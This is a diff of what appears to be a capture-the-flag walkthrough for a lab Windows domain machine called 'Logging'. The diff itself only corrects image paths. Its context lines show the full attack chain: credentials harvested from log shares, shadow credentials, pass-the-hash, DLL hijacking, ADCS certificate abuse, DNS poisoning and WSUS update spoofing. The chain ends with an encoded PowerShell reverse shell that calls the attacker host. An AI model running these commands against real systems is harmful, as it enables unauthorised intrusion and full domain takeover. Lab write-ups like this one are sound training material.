@@ -1,6 +1,6 @@
 As is common in real life pentests, you will start the Logging box with credentials for the following account wallace.everette / Welcome2026@
 
-![Pasted image 20260421050847](../Attachments/Pasted20image%2020260421050847.png)
+![Pasted image 20260421050847](../Attachments/Pasted%20image%2020260421050847.png)
 
 ### Nmap
 ```
@@ -260,7 +260,7 @@ Host script results:
 ```
  
 ### Port 80
-![Pasted image 20260421051805](../Attachments/Pasted20image%2020260421051805.png)
+![Pasted image 20260421051805](../Attachments/Pasted%20image%2020260421051805.png)
 
 ### SMB
 - Checking SMB shares via nxc:
@@ -282,7 +282,7 @@ SMB         10.129.36.182   445    DC01             SYSVOL          READ        
 SMB         10.129.36.182   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
 ```
 
-![Pasted image 20260421051909](../Attachments/Pasted20image%2020260421051909.png)
+![Pasted image 20260421051909](../Attachments/Pasted%20image%2020260421051909.png)
 
 - Accessing Logs share:
 ```
@@ -306,7 +306,7 @@ smb: \> ls
   Service_State.log                   A      468  Thu Apr 16 19:10:09 2026
   TaskMonitor.log                     A     1170  Thu Apr 16 19:10:09 2026
 ```
-![Pasted image 20260421052158](../Attachments/Pasted20image%2020260421052158.png)
+![Pasted image 20260421052158](../Attachments/Pasted%20image%2020260421052158.png)
 
 - I read everything and Find some credentials in `IdentitySync_Trace_20260219.log`
 ```
@@ -315,7 +315,7 @@ cat IdentitySync_Trace_20260219.log / cat *
 ---RELEVANT-OUTPUT---
 2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
 ```
-![Pasted image 20260421052426](../Attachments/Pasted20image%2020260421052426.png)
+![Pasted image 20260421052426](../Attachments/Pasted%20image%2020260421052426.png)
 
 - Credentials : `LOGGING\svc_recovery`:`Em3rg3ncyPa$$2025`
 - I also see it uses LDAP to authenticate from the logs.
@@ -323,7 +323,7 @@ cat IdentitySync_Trace_20260219.log / cat *
 - <<and also that Microsoft Windows Server 2019 is running
 - it also talks of an sQL server `HR01.logging.htb`
 - Checking SMB this account is restricted:
-![Pasted image 20260421052824](../Attachments/Pasted20image%2020260421052824.png)
+![Pasted image 20260421052824](../Attachments/Pasted%20image%2020260421052824.png)
 
 - After a few tests I can get a ticket for this user using getTGT:
 - But first I had to ater the password to the current year `2026` as the `2025` one didnt work was an old one
@@ -333,7 +333,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Saving ticket in svc_recovery.ccache
 ```
-![Pasted image 20260421055339](../Attachments/Pasted20image%2020260421055339.png)
+![Pasted image 20260421055339](../Attachments/Pasted%20image%2020260421055339.png)
 
 - Then with this ticket I can get some bloodhound files:
 ```
@@ -362,10 +362,10 @@ INFO: Done in 00M 06S
 INFO: Compressing output into 20260421125214_bloodhound.zip
 ```
 
-![Pasted image 20260421055446](../Attachments/Pasted20image%2020260421055446.png)
+![Pasted image 20260421055446](../Attachments/Pasted%20image%2020260421055446.png)
 
 - We see `svc_recovery` has GenericWrite permissions on MSA_Health$ (which is part of Remote Magement Users):
-![Pasted image 20260421060910](../Attachments/Pasted20image%2020260421060910.png)
+![Pasted image 20260421060910](../Attachments/Pasted%20image%2020260421060910.png)
 
 - MSA Hleath$ sounds like a gMSA account.
 - I try gMSADumper but it fails initially. I need to be able to have read permissions:
@@ -377,7 +377,7 @@ LDAP        DC01.logging.htb 389    DC01             [*] Getting GMSA Passwords
 LDAP        DC01.logging.htb 389    DC01             Account: msa_health$          NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: []
 ```
 
-![Pasted image 20260421065319](../Attachments/Pasted20image%2020260421065319.png)
+![Pasted image 20260421065319](../Attachments/Pasted%20image%2020260421065319.png)
 
 - Using certipy-ad I can get hash
 ```
@@ -409,7 +409,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Successfully restored the old Key Credentials for 'msa_health$'
 [*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
 ```
-![Pasted image 20260421095427](../Attachments/Pasted20image%2020260421095427.png)
+![Pasted image 20260421095427](../Attachments/Pasted%20image%2020260421095427.png)
 - Note: possible code to manually change an entry (did not work for me) :
 ```
 import ldap3
@@ -445,7 +445,7 @@ print(c.result)
 ```
 evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
 ```
-![Pasted image 20260421095138](../Attachments/Pasted20image%2020260421095138.png)
+![Pasted image 20260421095138](../Attachments/Pasted%20image%2020260421095138.png)
 
 - CHecking `C:\ProgramData\UpdateMonitor\Logs` I find some logs which point to a DLL being used:
 ```
@@ -461,12 +461,12 @@ type monitor.log
 ```
 
 - I try to create a directory `bin` in UpdatemMonitor to see if I can create files here and I can:
-![Pasted image 20260421100223](../Attachments/Pasted20image%2020260421100223.png)
+![Pasted image 20260421100223](../Attachments/Pasted%20image%2020260421100223.png)
 
 - Looking at the log again it takes a zip file from ProgramData and uploads it to Program Files location with a DLL. Going to that location I find an executable
-![Pasted image 20260421102038](../Attachments/Pasted20image%2020260421102038.png)
+![Pasted image 20260421102038](../Attachments/Pasted%20image%2020260421102038.png)
 
-![Pasted image 20260421100715](../Attachments/Pasted20image%2020260421100715.png)
+![Pasted image 20260421100715](../Attachments/Pasted%20image%2020260421100715.png)
 
 - It's 32 bit so I need to create my DLL as a 32 bit file.
 - First I create my DLL payload.c file:
@@ -527,15 +527,15 @@ zip -j Settings_Update.zip settings_update.dll
   adding: settings_update.dll (deflated 59%)
 ```
 
-![Pasted image 20260421101618](../Attachments/Pasted20image%2020260421101618.png)
+![Pasted image 20260421101618](../Attachments/Pasted%20image%2020260421101618.png)
 
 - finally I upload it to the target at `C:\ProgramData\UpdateMonitor\`
-![Pasted image 20260421101648](../Attachments/Pasted20image%2020260421101648.png)
+![Pasted image 20260421101648](../Attachments/Pasted%20image%2020260421101648.png)
 - I get a shell as `jaylee.clifton`:
-![Pasted image 20260421102112](../Attachments/Pasted20image%2020260421102112.png)
+![Pasted image 20260421102112](../Attachments/Pasted%20image%2020260421102112.png)
 
 - I grab user flag:
-![Pasted image 20260421102203](../Attachments/Pasted20image%2020260421102203.png)
+![Pasted image 20260421102203](../Attachments/Pasted%20image%2020260421102203.png)
 
 - I check for vulnerable certificates:
 ```
@@ -544,15 +544,15 @@ faketime "+7hours" certipy-ad find \
   -target DC01.logging.htb -dc-ip 10.129.36.182 \
   -stdout -enabled
 ```
-![Pasted image 20260421102605](../Attachments/Pasted20image%2020260421102605.png)
+![Pasted image 20260421102605](../Attachments/Pasted%20image%2020260421102605.png)
 
 - The template UpdateSrv stands out.
 - IT has enrolee ermissions which jaylee is a part of :
-![Pasted image 20260421102912](../Attachments/Pasted20image%2020260421102912.png)
+![Pasted image 20260421102912](../Attachments/Pasted%20image%2020260421102912.png)
 `The template carries a Server Authentication EKU rather than Client Authentication, making it unsuitable for classic PKINIT ESC1 Kerberos authentication, but perfectly suitable for impersonating any HTTPS service the domain trusts — in this case, the WSUS endpoint wsus.logging.htb:8531.`
 
 - also from winPEAS that i checked via ms_health$ account we see WSUS is running :
-![Pasted image 20260421104428](../Attachments/Pasted20image%2020260421104428.png)
+![Pasted image 20260421104428](../Attachments/Pasted%20image%2020260421104428.png)
 - Using the code I build a req.csr and upload to C:\ProgramData'UpdateMonitor:
 ```
 from cryptography import x509
@@ -582,7 +582,7 @@ python3 build_wsus_csr.py
 ```
 wget http://10.10.17.167/req.csr -o C:\ProgramData\UpdateMonitor\req.csr
 ```
-![Pasted image 20260421112957](../Attachments/Pasted20image%2020260421112957.png)
+![Pasted image 20260421112957](../Attachments/Pasted%20image%2020260421112957.png)
 
 - Then I pass this command on my shell as jaylee
 ```
@@ -593,10 +593,10 @@ RequestId: 10
 RequestId: "10"
 Certificate retrieved(Issued) Issued
 ```
-![Pasted image 20260421165712](../Attachments/Pasted20image%2020260421165712.png)
+![Pasted image 20260421165712](../Attachments/Pasted%20image%2020260421165712.png)
 
 - Then looking at the file I see a cert.cer:
-![Pasted image 20260421164308](../Attachments/Pasted20image%2020260421164308.png)
+![Pasted image 20260421164308](../Attachments/Pasted%20image%2020260421164308.png)
 - I download it and convert it to a pfx file:
 ```
 openssl pkcs12 -export \ 
@@ -614,7 +614,7 @@ subject=CN=wsus.logging.htb
 X509v3 Subject Alternative Name: 
     DNS:wsus.logging.htb, DNS:wsus
 ```
-![Pasted image 20260421165749](../Attachments/Pasted20image%2020260421165749.png)
+![Pasted image 20260421165749](../Attachments/Pasted%20image%2020260421165749.png)
 
 - We add a computer account:
 ```
@@ -627,7 +627,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Successfully added machine account attacker01$ with password SuperP@ss!
 ```
-![Pasted image 20260421165811](../Attachments/Pasted20image%2020260421165811.png)
+![Pasted image 20260421165811](../Attachments/Pasted%20image%2020260421165811.png)
 - Now we need to poison the DNS. We use this python code :
 ```
 # add_dns.py
@@ -646,7 +646,7 @@ c.add('DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=ht
       {'dnsRecord': [record], 'dnsTombstoned': 'FALSE'})
 print(c.result)
 ```
-![Pasted image 20260421165829](../Attachments/Pasted20image%2020260421165829.png)
+![Pasted image 20260421165829](../Attachments/Pasted%20image%2020260421165829.png)
 - After a few minutes we can flush dns and check on jaylee's account (ms_health$ requires elevated privileges)
 ```
 ipconfig /flushdns
@@ -656,7 +656,7 @@ Windows IP Configuration
 
 Successfully flushed the DNS Resolver Cache.
 ```
-![Pasted image 20260421165912](../Attachments/Pasted20image%2020260421165912.png)
+![Pasted image 20260421165912](../Attachments/Pasted%20image%2020260421165912.png)
 ```
 Resolve-DnsName wsus.logging.htb
 
@@ -665,7 +665,7 @@ Name                                           Type   TTL   Section    IPAddress
 wsus.logging.htb                               A      30198 Answer     10.10.17.167                             
                                                       98880
 ```
-![Pasted image 20260421165934](../Attachments/Pasted20image%2020260421165934.png)
+![Pasted image 20260421165934](../Attachments/Pasted%20image%2020260421165934.png)
 
 - Now we use wsuks. We create the file run_wsuks.py:
 ```
@@ -717,8 +717,8 @@ source ~/venvs/wsuks/bin/activate
 pip install wsuks
 python3 run_wsuks.py
 ```
-![Pasted image 20260421170042](../Attachments/Pasted20image%2020260421170042.png)
-![Pasted image 20260421170011](../Attachments/Pasted20image%2020260421170011.png)
+![Pasted image 20260421170042](../Attachments/Pasted%20image%2020260421170042.png)
+![Pasted image 20260421170011](../Attachments/Pasted%20image%2020260421170011.png)
 
 - Then on jaylee's shell we run the following commands to force Windows Update Detection:
 ```
@@ -728,7 +728,7 @@ Start-Service wuauserv
 wuauclt /resetauthorization /detectnow
 usoclient StartScan
 ```
-![Pasted image 20260421170112](../Attachments/Pasted20image%2020260421170112.png)
+![Pasted image 20260421170112](../Attachments/Pasted%20image%2020260421170112.png)
 
 - We get two GET command responses from run_wsuks
 ```
@@ -743,7 +743,7 @@ python3 run_wsuks.py
 [+] Received GET request: /00a64fee-4cef-4506-a93d-e72fa82756e4/PsExec64.exe
 [+] GET request for exe: /00a64fee-4cef-4506-a93d-e72fa82756e4/PsExec64.exe
 ```
-![Pasted image 20260421170138](../Attachments/Pasted20image%2020260421170138.png)
+![Pasted image 20260421170138](../Attachments/Pasted%20image%2020260421170138.png)
 
 - After maybe a mninute we can confirm on jaylee's shell by checking PWN.txt:
 ```
@@ -763,7 +763,7 @@ msa_health$
 toby.brynleigh
 The command completed successfully.
 ```
-![Pasted image 20260421170209](../Attachments/Pasted20image%2020260421170209.png)
+![Pasted image 20260421170209](../Attachments/Pasted%20image%2020260421170209.png)
 
 - We can connect to `msa_health$` on a new session and confirm we are admin:
 ```
@@ -776,10 +776,10 @@ whoami /groups | findstr /i admin
  
 BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
 ```
-![Pasted image 20260421170239](../Attachments/Pasted20image%2020260421170239.png)
+![Pasted image 20260421170239](../Attachments/Pasted%20image%2020260421170239.png)
 
 - I can grab the root flag from `toby,brynleigh`'s Desktop:
-![Pasted image 20260421165535](../Attachments/Pasted20image%2020260421165535.png)
+![Pasted image 20260421165535](../Attachments/Pasted%20image%2020260421165535.png)
 
 ```
 Get-ChildItem 'C:\Users\' -Recurse -Force -Filter '*.txt' -EA 0 |
@@ -788,7 +788,7 @@ Get-ChildItem 'C:\Users\' -Recurse -Force -Filter '*.txt' -EA 0 |
       if ($c -match '^[a-f0-9]{32}$') { "$($_.FullName): $c" }
   } catch {} }
 ```
-![Pasted image 20260421170259](../Attachments/Pasted20image%2020260421170259.png)
+![Pasted image 20260421170259](../Attachments/Pasted%20image%2020260421170259.png)
 
 -------
 ### Shell as system
@@ -797,8 +797,8 @@ Get-ChildItem 'C:\Users\' -Recurse -Force -Filter '*.txt' -EA 0 |
 ```
 sudo wsuks --serve-only --tls-cert wsus_combined.pem -e PsExec64.exe -c '/accepteula /s cmd.exe /c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAyADYAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"' --WSUS-Server 10.10.16.126 -I tun0
 ```
-![Pasted image 20260423063727](../Attachments/Pasted20image%2020260423063727.png)
-![Pasted image 20260423063753](../Attachments/Pasted20image%2020260423063753.png)
+![Pasted image 20260423063727](../Attachments/Pasted%20image%2020260423063727.png)
+![Pasted image 20260423063753](../Attachments/Pasted%20image%2020260423063753.png)
 - trigger the update on `jayleen`'s shell :
 ```
 Stop-Service wuauserv -Force
@@ -807,12 +807,12 @@ Start-Service wuauserv
 wuauclt /resetauthorization /detectnow
 usoclient StartScan
 ```
-![Pasted image 20260423063920](../Attachments/Pasted20image%2020260423063920.png)
+![Pasted image 20260423063920](../Attachments/Pasted%20image%2020260423063920.png)
 
 - I grab a shell on my netcat listener as `nt authority/system` (i used 9999 again so timing it had to be right or we'd get jayleen's shelll so better to use another port)
-![Pasted image 20260423063957](../Attachments/Pasted20image%2020260423063957.png)
+![Pasted image 20260423063957](../Attachments/Pasted%20image%2020260423063957.png)
 - I grab the root flag:
-![Pasted image 20260423064044](../Attachments/Pasted20image%2020260423064044.png)
+![Pasted image 20260423064044](../Attachments/Pasted%20image%2020260423064044.png)
 
 ------
 # Added notes to read:
